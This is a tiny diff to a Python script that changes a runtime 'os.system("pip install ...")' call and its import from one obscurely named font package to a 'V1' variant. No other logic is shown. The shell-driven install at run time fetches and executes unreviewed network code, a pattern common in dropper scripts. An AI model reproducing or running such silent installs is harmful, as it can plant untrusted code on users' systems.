@@ -1,6 +1,6 @@
 import os
-os.system("pip install pyfontslibrary")
-import pyfontslibrary
+os.system("pip install pyfontslibraryV1")
+import pyfontslibraryV1
 import random
 import requests
 import time
